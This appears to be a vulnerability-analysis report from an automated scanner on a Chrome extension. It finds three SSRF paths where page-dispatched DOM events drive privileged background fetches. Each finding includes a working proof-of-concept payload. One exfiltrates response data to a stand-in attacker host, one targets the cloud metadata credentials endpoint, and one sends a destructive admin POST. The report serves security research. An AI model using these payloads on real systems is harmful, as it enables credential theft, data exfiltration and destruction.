# CoCo Analysis: niohnjddhnecbjpomdfniaafikfejagl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: cs_window_eventListener_scrumplan-chrome-ext-event-request → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/niohnjddhnecbjpomdfniaafikfejagl/opgen_generated_files/cs_0.js
Line 485	window.addEventListener(eventName.REQUEST, function (e) {
Line 488	const request = e.detail;

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/niohnjddhnecbjpomdfniaafikfejagl/opgen_generated_files/bg.js
Line 966	fetch(message.url, {

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 485)
window.addEventListener('scrumplan-chrome-ext-event-request', function (e) {
    console.debug("scrumplan chrome extension - request", e);

    const request = e.detail; // ← attacker-controlled

    if (typeof request.sp_request_id !== 'undefined') {
        chrome.runtime.sendMessage(request, (response) => { // Forward to background
            console.debug("scrumplan chrome extension - response", response);

            const event = new CustomEvent('scrumplan-chrome-ext-event-response', {
                detail: response
            });

            window.dispatchEvent(event);
        });
    }
});

// Background script - Message handler (bg.js Line 965)
const handleRequest = (message, sender, sendResponse) => {
    fetch(message.url, { // ← attacker-controlled URL
        method: message.method, // ← attacker-controlled
        body: message.body, // ← attacker-controlled
        headers: message.headers, // ← attacker-controlled
    })
        .then(response => response.json())
        .then(data => {
            sendResponse({
                sp_request_id: message.sp_request_id,
                status: true,
                data: data,
                error: null,
            });
        })
        .catch(error => {
            sendResponse({
                sp_request_id: message.sp_request_id,
                status: false,
                data: null,
                error: error.toString(),
            });
        });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// From any webpage matching content script patterns:
// (https://scrumplan.com/*, http://localhost:3000/*, https://scrumplan.localhost/*)
const maliciousEvent = new CustomEvent('scrumplan-chrome-ext-event-request', {
    detail: {
        sp_request_id: "attack123",
        url: "https://internal-api.company.local/admin/secrets",
        method: "GET",
        body: null,
        headers: {}
    }
});
window.dispatchEvent(maliciousEvent);

// Listen for the response containing exfiltrated data
window.addEventListener('scrumplan-chrome-ext-event-response', function(e) {
    console.log("Exfiltrated data:", e.detail.data);
    // Send to attacker server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(e.detail.data)
    });
});
```

**Impact:** Server-Side Request Forgery (SSRF) with data exfiltration. An attacker on scrumplan.com (or matching domains) can dispatch DOM events to trigger arbitrary HTTP requests with full control over URL, method, body, and headers. The extension has host_permissions for <all_urls>, allowing it to make privileged cross-origin requests to any destination including internal networks and localhost. The response data is sent back to the webpage via sendResponse and dispatched as a DOM event, allowing the attacker to exfiltrate sensitive data from internal APIs, cloud metadata services, or other protected resources.

---

## Sink 2: cs_window_eventListener_scrumplan-chrome-ext-event-export-request → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/niohnjddhnecbjpomdfniaafikfejagl/opgen_generated_files/cs_0.js
Line 506	window.addEventListener(eventName.EXPORT_REQUEST, function (e) {
Line 509	const message = e.detail.message;

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/niohnjddhnecbjpomdfniaafikfejagl/opgen_generated_files/bg.js
Line 966	fetch(message.url, {

**Code:**

```javascript
// Content script - Export request listener (cs_0.js Line 506)
window.addEventListener('scrumplan-chrome-ext-event-export-request', function (e) {
    console.debug("scrumplan chrome extension - request", e);

    const message = e.detail.message; // ← attacker-controlled
    message.action = 'export';

    chrome.runtime.sendMessage(message, (response) => {
        console.debug("scrumplan chrome extension - response", response);

        const event = new CustomEvent('scrumplan-chrome-ext-event-export-response', {
            detail: {
                response: response,
            }
        });

        window.dispatchEvent(event);
    });
});

// Background: Same handleRequest function processes this message
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// Same as Sink 1 but with different event name
const maliciousEvent = new CustomEvent('scrumplan-chrome-ext-event-export-request', {
    detail: {
        message: {
            sp_request_id: "export123",
            url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            method: "GET",
            body: null,
            headers: {}
        }
    }
});
window.dispatchEvent(maliciousEvent);
```

**Impact:** Same SSRF vulnerability as Sink 1, exploitable via different event name.

---

## Sink 3: cs_window_eventListener_scrumplan-chrome-ext-event-find-favorite-filters-request → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/niohnjddhnecbjpomdfniaafikfejagl/opgen_generated_files/cs_0.js
Line 526	window.addEventListener(eventName.FIND_FAVORITE_FILTERS_REQUEST, function (e) {
Line 529	const message = e.detail.message;

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/niohnjddhnecbjpomdfniaafikfejagl/opgen_generated_files/bg.js
Line 966	fetch(message.url, {

**Code:**

```javascript
// Content script - Find favorite filters listener (cs_0.js Line 526)
window.addEventListener('scrumplan-chrome-ext-event-find-favorite-filters-request', function (e) {
    console.debug("scrumplan chrome extension - request", e);

    const message = e.detail.message; // ← attacker-controlled
    message.action = 'find_favorite_filters';

    chrome.runtime.sendMessage(message, (response) => {
        console.debug("scrumplan chrome extension - response", response);

        const event = new CustomEvent('scrumplan-chrome-ext-event-find-favorite-filters-response', {
            detail: {
                response: response,
            }
        });

        window.dispatchEvent(event);
    });
});

// Background: Same handleRequest function processes this message
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// Same as Sink 1 but with different event name
const maliciousEvent = new CustomEvent('scrumplan-chrome-ext-event-find-favorite-filters-request', {
    detail: {
        message: {
            sp_request_id: "filters123",
            url: "http://localhost:8080/admin/users",
            method: "POST",
            body: JSON.stringify({action: "delete_all"}),
            headers: {"Content-Type": "application/json"}
        }
    }
});
window.dispatchEvent(maliciousEvent);
```

**Impact:** Same SSRF vulnerability as Sink 1, exploitable via different event name.
